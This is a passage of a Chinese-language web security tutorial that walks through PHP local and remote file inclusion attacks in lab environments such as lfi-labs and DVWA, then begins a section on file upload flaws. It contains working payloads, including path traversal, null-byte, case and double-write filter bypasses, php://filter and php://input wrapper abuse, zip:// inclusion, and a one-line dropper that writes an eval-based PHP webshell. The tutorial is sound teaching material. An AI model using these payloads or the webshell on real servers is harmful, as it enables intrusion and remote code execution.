#  文件包含漏洞

## 01.文件包含

### 文件包含漏洞

文件包含漏洞（File Inclusion Vulnerability）是一种Web应用程序常见的安全漏洞，通常发生在PHP语言中，攻击者可以通过该漏洞加载和执行服务器上的任意文件，甚至执行恶意脚本，获取敏感信息或执行任意代码。

##### 文件包含漏洞通常分为两种类型：

1. 本地文件包含（LFI, Local File Inclusion）：

本地文件包含漏洞发生在攻击者利用Web应用中的输入参数，将服务器上的本地文件作为响应内容的一部分读取或执行。

攻击者可以通过这个漏洞读取服务器上的敏感文件（如/etc/passwd、配置文件等），甚至执行某些脚本文件，导致信息泄露或远程代码执行。

2. 远程文件包含（RFI, Remote File Inclusion）：

远程文件包含漏洞允许攻击者通过Web应用程序的输入参数，从外部服务器加载并执行远程的恶意脚本。

如果服务器的配置允许从外部资源加载文件，攻击者可以利用这个漏洞上传恶意代码到远程服务器并在目标Web服务器上执行。

### 文件包含定义

文件包含（File Inclusion）是Web开发中一种加载和执行文件的机制，通常用于将外部文件的内容包含到当前文件中。

文件包含的作用是使代码更模块化、可重用，避免重复编写相同的功能。

在许多编程语言（如PHP、Python等）中，文件包含是实现代码共享和组织代码结构的常用方法。

#### 在Web开发中，文件包含常见于以下情况：

- 模板文件：动态加载HTML页面的不同部分（如头部、导航栏、底部）。
- 配置文件：包含数据库连接配置或其他系统设置。
- 函数库或模块：加载实现某些特定功能的文件。

```bash
include'header.php';

require'config.php';
```

### 文件包含漏洞-成因

文件包含漏洞的成因主要是由于Web应用程序在实现文件包含功能时，对用户输入的文件路径缺乏充分的验证和过滤，导致攻击者可以控制文件的加载过程。以下是文件包含漏洞常见的成因：

#### 缺乏输入验证和过滤：

当Web应用程序允许用户输入文件路径或名称，并使用该输入来动态加载文件时，

如果没有对输入进行严格的验证和过滤，攻击者可能会通过修改输入加载任意文件。

![image-20241031165210505](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165210505.png)

####  使用不安全的文件包含函数：

在编程语言中，像PHP的include()、require()、include_once()和require_once()等函数可以加载指定路径的文件。

开发人员如果直接使用这些函数加载用户输入的路径而不加以限制，就可能引入文件包含漏洞。

- `include()`：尝试加载并执行指定文件。如果文件不存在或加载失败，程序会继续执行，并发出警告（warning）。
- `require()`：与include()类似，但如果文件不存在或加载失败，会抛出致命错误（fatal error），程序终止执行。
- `include_once()`：与include()功能相同，但如果之前已经加载过相同的文件，则不会再次加载。这有助于避免重复加载相同的文件。
- `require_once()`：与require()功能相同，但如果之前已经加载过相同的文件，则不会再次加载。

![image-20241031165226304](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165226304.png)

用户可以通过`?page=../../etc/passwd`尝试加载系统上的敏感文件。



#### 目录遍历（Path Traversal）：

目录遍历是指攻击者通过在输入中添加../等目录跳转字符来访问服务器的上级目录。例如，输入../../etc/passwd可能会导致加载敏感的系统文件。
        如果应用程序没有正确处理这些特殊字符，攻击者就可以利用它们访问本地文件系统中的任意文件。

#### 不安全的服务器配置：

在PHP等编程语言中，如果服务器配置允许从远程服务器加载文件（例如PHP的allow_url_include设置为On），

就可能被利用来执行远程文件包含（RFI）攻击。

远程文件包含漏洞可以让攻击者从外部服务器加载恶意代码并在目标服务器上执行，导致远程代码执行等高风险问题。

#### 缺乏文件路径限制：

开发者没有对可以包含的文件进行白名单控制，或者没有使用绝对路径限制加载的范围。

如果应用程序可以任意加载文件，就可能导致攻击者通过构造输入加载系统文件或其他敏感文件。

#### 总结

- 1.没有合理地进行校验
- 2.被绕过





## 02.文件包含示例

### 示例1-维基百科

请先对代码进行阅读

![image-20241031084741146](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031084741146.png)

- 对于英语：http://yourdomain.com/index.php?language=english
- 对于法语：http://yourdomain.com/index.php?language=french
- 恶意构造：http://yourdomain.com/index.php?language=“恶意构造的代码”

#### 示例说明

![image-20241031084858033](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031084858033.png)

### 示例2-DVWA

#### 在dvwa靶场演示：

根据我们的点击，显示正常的网页

http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php

![image-20241031165254108](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165254108.png)

#### 更改网站，查看phpinfo

http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../phpinfo.php

![image-20241031165341220](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031165341220.png)

## 03.伪协议简介

### 伪协议

伪协议，为什么危险？因为它们能够操作文件

![image-20241031085135475](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031085135475.png)

### PHP伪协议

PHP伪协议（PHP Wrapper）是指PHP中的一种特性，允许开发者通过指定一个特殊的协议前缀来访问不同类型的资源。

伪协议的主要目的是扩展PHP的文件系统能力，使其能够访问不同类型的数据源，除了常规的文件系统之外。

PHP支持多种伪协议，常见的包括

```bash
file://：用于访问本地文件系统中的文件。
$content = file_get_contents('file:///path/to/local/file.txt');

http:// 和 https://：用于通过HTTP或HTTPS协议访问远程资源。
$content = file_get_contents('http://example.com');

ftp://：用于通过FTP协议访问远程FTP服务器上的文件。
$content = file_get_contents('ftp://username:password@ftp.example.com/file.txt');

data://：用于直接使用数据字符串作为资源。
$data = file_get_contents('data:text/plain;base64,SGVsbG8gd29ybGQ=');
```

**filter伪协议**是一种特殊的伪协议，用于在读取或写入数据时应用过滤器。

它可以用于多种用途，如数据验证、清理或转换。

filter流可以通过 `php://filter` 来使用，主要用于对流内容应用内置的过滤器。

```bash
php://filter/[filter_name]/resource
```

其中 [filter_name] 是要应用的过滤器名称，resource 是要过滤的实际资源（如文件或字符串）。

### 内置过滤器

```php
string.strip_tags：去掉字符串中的HTML和PHP标签。
string.toupper：将字符串转换为大写。
string.tolower：将字符串转换为小写。
url：对URL进行编码。

$html = "<p>Hello <strong>World</strong>!</p>";
$filtered = file_get_contents('php://filter/string.strip_tags/resource=' . urlencode($html));
echo $filtered;  // 输出: Hello World!

$string = "hello world";
$filtered = file_get_contents('php://filter/string.toupper/resource=' . urlencode($string));
echo $filtered;  // 输出: HELLO WORLD
```

### input

在PHP中，`php://input` 是一个伪协议流，用于读取原始POST数据，**将post上来的数据当作php代码进行处理**。

这对于处理HTTP POST请求时传递的数据（特别是JSON或XML格式的内容）非常有用。

```php
// 设置请求头 Content-Type 为 application/json
// {"name": "John", "age": 30}

$jsonData = file_get_contents("php://input");
$data = json_decode($jsonData, true); // 将JSON数据转换为PHP数组
echo"Name: " . $data['name'] . "<br>"; 
echo"Age: " . $data['age'];
```

### 其他利用方式

- 00截断
- 长度截断（windows256，linux 4096）

- 包含文件日志

- 包含session


## 04.文件包含随堂练习

### LFI 本地文件包含

#### lfi-labs靶场

在网络安全领域中，实践是检验真理的唯一标准。

`lfi-labs`是一款专注于本地文件包含（LFI）、远程文件包含（RFI）和命令注入漏洞练习的工具包。

这个由jose nazario创建的项目，不仅提供了学习这些高级渗透测试技巧的机会，还为测试检测产品和开发攻防技能搭建了实验平台。

github：https://github.com/paralax/lfi-labs

```bash
git clone https://github.com/paralax/lfi-labs
```

#### LFI-1

![image-20241031101344055](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101344055.png)

然后点开LFI-1，出现如下界面

![image-20241031101119820](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101119820.png)

##### GET请求、POST请求

1. GET 请求（获取资源、查询数据等场景）

参数传递方式：GET 请求将参数附加在 URL 的查询字符串中。

```bash
http://example.com/page?name=John&age=30
```

数据长度限制：由于 URL 的长度有限，GET 请求的传递数据大小也受到限制，通常为几千字节。
安全性：因为参数在 URL 中明文显示，不适合传输敏感信息（如密码）。

2. POST 请求（适用于提交表单、上传文件或执行对服务器资源有影响的操作，如登录、注册和提交订单等。）

参数传递方式：POST 请求将数据放在请求体中，而不是 URL 中。客户端发送的请求示例：

```bash
POST /submit-form HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=John&age=30
```

- 数据长度限制：理论上没有限制，可以传输更大数据量。服务器配置和客户端实现可能会对其大小施加限制。
- 安全性：参数在请求体中传输，相比 GET 更适合传输敏感数据（但仍需配合 HTTPS 使用，才能保证数据加密传输）。

##### 源码

![image-20241031093037772](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031093037772.png)

```php
<?php     include("../common/header.php");   ?>

<!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
<?php hint("will include the arg specified in the GET parameter \"page\""); ?>

<form action="/LFI-1/index.php" method="GET">
    <input type="text" name="page">
</form>

<?php
include($_GET["page"]);
?>

```

##### 实验步骤

通过get方法传递page参数，然后通过include执行，因此可以通过page传入恶意文件

1. 创建1.txt文件，里面写内容，然后保存

2. 复制文件路径，‪`C:\file\1.txt`

3. 在框里输入文件路径

> 注意：`C://文件夹/文件夹/文件名.txt`

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=C://file/1.txt
```

![image-20241031092552372](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031092552372.png)

输出了文件内容

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=C:\Windows\win.ini
```

![image-20241031091917428](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031091917428.png)

#### include

在PHP中，include 或 require 语句会将包含的文件当作PHP代码来执行。

无论文件的扩展名是什么，只要文件中的内容是有效的PHP代码，PHP都会解析并执行这些代码。

如果文件不包含有效的PHP代码（例如HTML、文本文件等），PHP会按照文件内容的原样输出。

即使文件扩展名不是.php，只要文件中有`<?php ... ?>`这样的PHP代码块，PHP会执行这些代码块。

##### 总的来讲

- 1、include会将文件内容当作PHP代码来解析。
- 2、文件的扩展名并不影响PHP的解析方式，只要文件内容符合PHP的语法规范，PHP就会执行其中的代码。

#### 00截断

在PHP中，“00截断”通常与文件包含（如include或require）相关，尤其是在处理动态文件包含时可能存在安全隐患。

00截断（Null Byte Truncation）是一种利用Web应用程序对上传文件处理不当的技巧，尤其是在处理文件名或文件内容时。

00截断依赖于某些编程语言或系统在遇到ASCII null字节（`\x00`）时的行为，即终止字符串解析或文件处理。

##### 原理

1. 文件名截断：上传文件时，在文件名中插入一个null字节，可能导致服务器在null字节处截断文件名，忽略null字节后的部分。

   这可以用来绕过基于文件名的过滤或检查。

2. 文件内容截断：在文件内容中插入`null`字节，可能导致文件内容在null字节处被截断，这可以用来隐藏或插入恶意内容。

3. 文件名：Web应用只允许上传.jpg文件，通过在文件名中使用`null`字节，攻击者可以上传一个文件，如`shell.php\x00.jpg`。

   上传时只看到.jpg扩展名，允许上传，解析时解析成shell.php。

4. 文件内容：Web应用在处理文件内容时遇到null字节就停止读取，攻击者可以在合法文件内容后插入`null`字节，然后跟上恶意代码。

#### LFI-2 00截断

##### 00截断

PHP `5.3.29`及其之前的版本存在`00`漏洞，phpstudy一般下载都会失败

访问：https://windows.php.net/downloads/releases/archives/

##### 源码

![image-20241031095812790](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095812790.png)

```php
<?php
include("includes/".$_GET['library'].".php"); 
?>
```

> include/+文件名/+.php

`include/`理解为文件目录，回退使用`../`

后缀添加了`.php`,使用`%00`截断

##### 包含php文件

![image-20241031095728513](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095728513.png)

```bash
http://192.168.70.10:8101/LFI-2/index.php?library=../1
```

![image-20241031095624634](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031095624634.png)



##### 包含非php文件

比如一个ini，那么就使用`../../boot.ini`，然后再用`%00`吧.php截断

```bash
inlcude/../boot.ini%00.php
#或者直接访问目录下的php文件，只是不加扩展名了
```

#### LFI-3 黑名单:文件名后缀

![image-20241031100404087](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031100404087.png)

```bash
<?php
if (substr($_GET['file'], -4, 4) != '.php')
 echo file_get_contents($_GET['file']);
else
 echo 'You are not allowed to see source files!'."\n";
?>
```

> 黑名单:截取文件名后缀4个字符是否是`.php`

要访问目录中结尾是php的文件时候，系统会**判断你传入的文件名结尾**，如果是php文件，那么就不会让你进行文件内容获取

![image-20241031101632349](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101632349.png)

##### 点和斜线

**文件后缀名加点**    

把`php`变为 `php.`

> php.

PHP的`file_get_contents()`函数会根据传入的路径读取文件内容。

在文件系统中，实际文件的扩展名是`.php`，但由于传入的字符串包含额外的`.`，PHP仍然会解析并试图读取实际的`phpinfo.php`文件。

文件系统通常会将`phpinfo.php.`视为一个有效的文件名，但在字符串比较时，检查仍然基于传入的内容。

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php.
```

![image-20241031101740072](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101740072.png)



##### 大小写绕过

这里进行字符串比较就有漏洞，我们可以把php中任意一个或多个**换成大写**，这样进行判断的时候就能够绕过

比如我要查看`phpinfo.php`     就可以写成`phpinfo.Php`从而逃过检查

> .Php

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.Php
```

![image-20241031101827543](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101827543.png)

##### 空格绕过

比如我要查看`phpinfo.php`     就可以写成`phpinfo.php空格 ` ,从而逃过检查，判断的时候就可以绕过后缀名检查了

> .php空格
>
> .php%20
>
> .php%a0
>
> .php+

```bash
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php%20
http://192.168.70.10:8101/LFI-3/index.php?file=../LFI-2/1.php+
```

![image-20241031102023810](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031102023810.png)

![image-20241031101924137](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031101924137.png)

#### LFI-4

```bash
<?php
include('includes/class_'.addslashes($_GET['class']).'.php');
?>
```

绕过结尾增加的`.php`

`includes/class_`当成两个目录,使用`/`闭合当成`includes/class_/`

```bash
http://192.168.70.10:8101/LFI-4/index.php?class=/../../../1
```

![image-20241031103132345](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031103132345.png)

#### LFI-5

```php
<?php
   $file = str_replace('../', '', $_GET['file']);
   if(isset($file))
   {
       include("pages/$file");
   }
   else
   {
       include("index.php");
   }
?>
```

> - `../`  会被 替换成 **空**
> - `pages/`当成一个文件夹

##### 双写绕过

**../双写**

如果是  `..././`变成`../`

如果是`..././..././`，则会变为`../../`   可以一直向上级目录跳转

使用`..././..././phpinfo.php`是 `../../phpinfo.php`，即可访问到phpinfo.php

```bash
http://192.168.70.10:8101/LFI-5/index.php?file=..././..././1.php
```

![image-20241031104503198](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104503198.png)

#### LFI-6

这里看到是post方法传参的，因此需要将page进行post，当你进行传参的时候，其实你是看不到使用什么参数过去的

```bash
http://192.168.70.10:8101/LFI-6/index.php

page=../1.php
```

![image-20241031104745559](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104745559.png)

##### POST

这时候就需要开启`burp`，拦截消息，查看到我们测试输入的参数被page接收了

可以直接在这里进行修改，把123改为文件路径

或者使用`hackerbar` post

#### get shell

那么应该怎么通过文件包含去`getshell`呢

##### 上传图片码

首先，假设我们通过**文件上传手段**传入了**一张图像**`echo.jpg`，但是图像里面的内容是病毒代码

![image-20241031110615555](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031110615555.png)

```bash
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["shell"])?>');?>
```

> 代码逻辑：创建打开shell.php，在里面写入`<?php eval($_POST[shell])?>`
>

##### 包含图片码

触发创建文件

```bash
http://192.168.70.10:8101/LFI-6/index.php

page=../echo.jpg
```

![image-20241031111710151](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031111710151.png)

然后包含执行`../echo.jpg`，shell.php就被创建出来了



##### 访问shell.php

eval可以把字符串当作命令执行，因此可以执行我们post上去的shell参数中的内容

首先要运行`shell.php`

打开对应shell网址，发现没有内容

```bash
http://192.168.70.10:8101/LFI-6/shell.php
```

![image-20241031112725441](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031112725441.png)

##### 执行木马

通过hacker bar进行post，shell中传入`echo "Hello World!"`;

```bash
http://192.168.70.10:8101/LFI-6/shell.php

shell=echo "Hello World!";
shell=system(whoami);
```

![image-20241031112906713](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031112906713.png)

![image-20241031113044991](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113044991.png)

##### 蚁剑连接

```bash
http://192.168.70.10:8101/LFI-6/shell.php
shell
```

![image-20241031113158597](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113158597.png)

![image-20241031113215723](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031113215723.png)

#### LFI-7

```bash
<?php
include("includes/".$_POST['library'].".php"); 
?>
```

![image-20241031133637280](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031133637280.png)

原理是一样的，只不过这里library用的是post方法传参数的

> ../../1

```bash
http://192.168.70.10:8101/LFI-7/index.php

library=../../1
```

![image-20241031133858735](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031133858735.png)

#### LFI-8 

```bash
<?php
if (substr($_POST['file'], -4, 4) != '.php')
 echo file_get_contents($_POST['file']);
else
 echo 'You are not allowed to see source files!'."\n";
?>
```

可以变成`.php.`绕过，只不过用了`post`传参数

> .php.
>
> .Php
>
> .php+

```bash
http://192.168.70.10:8101/LFI-8/index.php

file=../1.php.
```

![image-20241031135239694](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135239694.png)

### filiter伪协议

#### 文件包函数：

- include();
- include_once();
- require();
- require_once();

#### 文件操作类函数：

- fopen();
- file();
- readfile();
- file_get_contents();......
- php://filter

`php://filter` 是一种元封装器，设计用于数据流打开时的筛选过滤应用

php属性设置中，无论`allow_url_fopen`，`allow_url_include`是否开启都可以使用

可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，

例如base64编码处理，rot13处理等

#### 伪协议用法

```bash
php://filter/read=convert.base64-encode/resource=c:/windows/win.ini
```

> read是要执行的操作
>
> convert.base64-encode的意思是读出的内容经过一次base64编码
>
> resource后面跟的是读取内容的路径

![image-20241031104101982](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104101982.png)

```bash
php://filter/过滤器|过滤器/resource=要过滤的数据流
```



```bash
echo file_get_contents
("php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,<?php phpinfo();?>");
```

> `data://text/plain` 是一种 PHP 数据流，允许您在 PHP 脚本中直接嵌入数据
>
> 上述代码对 `<?php phpinfo();?>` 进行了**两次base64编码**处理。

#### php://filter协议的过滤器分为四类

1. 字符串过滤器
2. 转换过滤器
3. 压缩过滤器
4. 加密过滤器

##### filter字符串过滤器

每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应。

字符串过滤器以 string 开头，常见的过滤器有 rot13、toupper、tolower等

![image-20241031104213171](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104213171.png)

##### filter转换过滤器

主要含有三类，分别是base64的编码转换、quoted-printable的编码转换以及iconv字符编码的转换。该类过滤器以convert（转换）开头。

- convert.base64-encode
- convert.base64-decode

将数据进行base64编码、解码

![image-20241031104253626](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031104253626.png)

#### LFI-1

包含函数并不直接看到代码而只是执行，但是通过`filter`方式可以将**代码显示**出来

##### php://filter显示index.php

例如LFI-1例子，使用了include，只能执行，看不到源码

> php://filter/convert.base64-encode/resource=index.php

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

![image-20241031135827653](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135827653.png)

```bash
PD9waHAgICAgIGluY2x1ZGUoIi4uL2NvbW1vbi9oZWFkZXIucGhwIik7ICAgPz4NCg0KPCEtLSBmcm9tIGh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS9leGVyY2lzZXMvcGhwX2luY2x1ZGVfYW5kX3Bvc3RfZXhwbG9pdGF0aW9uL2NvdXJzZSAtLT4NCjw/cGhwIGhpbnQoIndpbGwgaW5jbHVkZSB0aGUgYXJnIHNwZWNpZmllZCBpbiB0aGUgR0VUIHBhcmFtZXRlciBcInBhZ2VcIiIpOyA/Pg0KDQo8Zm9ybSBhY3Rpb249Ii9MRkktMS9pbmRleC5waHAiIG1ldGhvZD0iR0VUIj4NCiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFnZSI+DQo8L2Zvcm0+DQoNCjw/cGhwDQppbmNsdWRlKCRfR0VUWyJwYWdlIl0pOw0KPz4NCg==
```

###### base64解码

![image-20241031135904295](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135904295.png)

![image-20241031135935690](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135935690.png)

```php
<?php     include("../common/header.php");   ?>

<!-- from https://pentesterlab.com/exercises/php_include_and_post_exploitation/course -->
<?php hint("will include the arg specified in the GET parameter \"page\""); ?>

<form action="/LFI-1/index.php" method="GET">
    <input type="text" name="page">
</form>

<?php
include($_GET["page"]);
?>

```



##### php://filter显示win.ini

```bash
http://192.168.70.10:8101/LFI-1/index.php?page=php://filter/read=convert.base64-encode/resource=c:/windows/win.ini
```

这样就以`base64`编码方式输出了代码

![image-20241031135541255](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135541255.png)

###### base64解码

![image-20241031135652041](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031135652041.png)

### input

#### EX-1

> php版本：7.3.4

```bash
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://filter") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	if ($file!="http://www.baidu.com") echo "tips：flag在当前目录的某个文件中";
	include($file);
}else{
	echo '<a href="?file=http://www.baidu.com">click go baidu</a>';
}
?>
```

`php://input`会将post请求的数据当作php代码执行

![image-20241031140812924](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031140812924.png)

```bash
http://192.168.70.10:8101/EX-1/?file=http://www.baidu.com
```

![image-20241031163049093](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163049093.png)

打开EX-1，发现里面有个链接，点击后能跳转到百度

![image-20241031161457174](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031161457174.png)

使用`php://filter`试一下，结果显示我是黑客，也就是在php代码中已经对`filter`进行了防范

```bash
php://filter/convert.base64-encode/resource=index.php
```

![image-20241031161605419](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031161605419.png)

##### phpinfo

使用`php://input`将请求都变为`php`执行代码

![image-20241031162638058](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162638058.png)

就可以看见`phpinfo`信息了

```bash
GET /EX-1/?file=php://input HTTP/1.1
Host: 192.168.70.10:8101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.10:8101/EX-1/?file=
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 23

<?php echo phpinfo();?>
```



##### 写入木马

![image-20241031162812147](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162812147.png)

```bash
GET /EX-1/?file=php://input HTTP/1.1
Host: 192.168.70.10:8101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.10:8101/EX-1/?file=
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 71

<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["shell"])?>');?>
```

这里就写入成功了

![image-20241031162848855](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031162848855.png)

### ZIP伪协议

`zip://` 可以访问压缩包里面的文件。当它与包含函数结合时，`zip://`流会被当作php文件执行。

从而实现任意代码执行。

```bash
zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
zip://xxx.png#shell.php
```

在windows下测试要`5.3.0<PHP<5.4`才可以 `#`在浏览器中要编码为`%23`，否则浏览器默认不会传输特殊字符

> #### 注意：
>
> 1. ①`zip://`中只能传入**绝对路径**。
> 2. ②要用`#`分隔**压缩包**和**压缩包里的内容**，并且`#`要用url编码`%23`（即下述POC中#要用%23替换）
> 3. ③只需要是`zip`的压缩包即可，**后缀名可以任意更改**
>
> ```bash
> zip://C:/Users/32995/Desktop/FileInclude/press.zip%23press.php
> ```

#### EX-2

> php：5.3.29

```bash
//index.php
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if (!$file) echo '<a href="?file=upload">upload?</a>';
if(stristr($file,"input")||stristr($file, "filter")||stristr($file,"data")/*||stristr($file,"phar")*/){
	echo "hick?";
	exit();
}else{
	print_r($file);
	include($file);
}
?>
```

> 禁用php://input，php://filter，php://data，php://phar字符串
>
> 没禁用php://zip

![image-20241031163627689](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163627689.png)

![image-20241031163655854](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031163655854.png)

##### 1.php

```bash
<?php phpinfo();?>
```

![image-20241031164428248](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164428248.png)

##### 1.zip

![image-20241031164520919](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164520919.png)

##### zip://

> zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip#1.php
>
> zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip%231.php

```bash
http://192.168.70.10:8101/EX-2/?file=zip://C:\tools\phpstudy_pro\WWW\lfi-labs\EX-2\1.zip%231.php
```

![image-20241031164824575](https://image.201068.xyz/assets/13.中车高仿真场景靶场练习/image-20241031164824575.png)

# 文件上传

## 01.文件上传

### 文件上传漏洞

文件上传漏洞是一种常见的Web安全漏洞，攻击者可以通过上传恶意文件来执行未经授权的操作或获取服务器的控制权限。

通常，这些恶意文件可能是脚本文件（如PHP）或带有恶意代码的图片文件，上传到服务器后可以被执行或利用。

### 危害

- 远程代码执行：如果服务器允许上传脚本文件（如 .php），攻击者可以上传恶意脚本并通过访问该脚本来执行任意代码，获取服务器的控制权。
- Webshell：攻击者可以通过上传一个Webshell文件（如 .php 文件），用它来执行系统命令，进一步渗透服务器或窃取敏感数据。

- 信息泄露：上传的文件可能包含恶意代码，用于读取服务器上的敏感文件并将其传回攻击者。

- 拒绝服务攻击：攻击者可以上传大文件，耗尽服务器的存储空间或资源，导致服务无法正常运行。

- 权限提升：攻击者可能利用文件上传功能上传包含特定系统配置或敏感信息的文件，通过这些文件来提升自身权限。


### 利用方式

上传文件web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。

上传文件病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接 自动运行；

上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域下的行为;

上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；

上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。

除此之外，还有一些利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过"本地文件包含漏洞(Local File Include)"执行此脚本。

### 成因

#### 文件类型验证不严格：

仅检查文件的扩展名，而没有对文件内容进行验证。攻击者可以通过修改扩展名绕过限制，将恶意脚本伪装成普通文件（如图片、文本文件）进行上传。

#### 文件存储路径不安全：

上传的文件直接存储在Web可访问的目录中，且没有进行文件名随机化处理。攻击者可以直接访问该文件并执行恶意代码。

#### 缺少权限控制：

上传功能没有严格的权限控制，任何用户都可以上传文件。如果攻击者可以上传可执行的脚本文件，就可能会导致远程代码执行。

#### 文件大小限制不当：

没有对文件的大小进行限制，攻击者可以上传超大文件导致服务器资源耗尽，造成拒绝服务攻击。

#### 缺乏对上传文件的隔离措施：

上传的文件没有进行沙箱或隔离处理，导致文件在服务器上被执行时可能带来严重的安全风险。

#### 对文件执行权限配置不当：

上传目录配置了可执行权限，允许上传的脚本文件在服务器上执行。正确的做法是将文件上传目录配置为不可执行状态。

#### 对多种文件格式处理不当：

有些情况下，攻击者可以通过上传带有嵌入代码的文件（如PDF、Excel文件）并利用特定的解析漏洞来进行攻击。



## 02.靶场练习

### upload-labs

#### upload-labs介绍

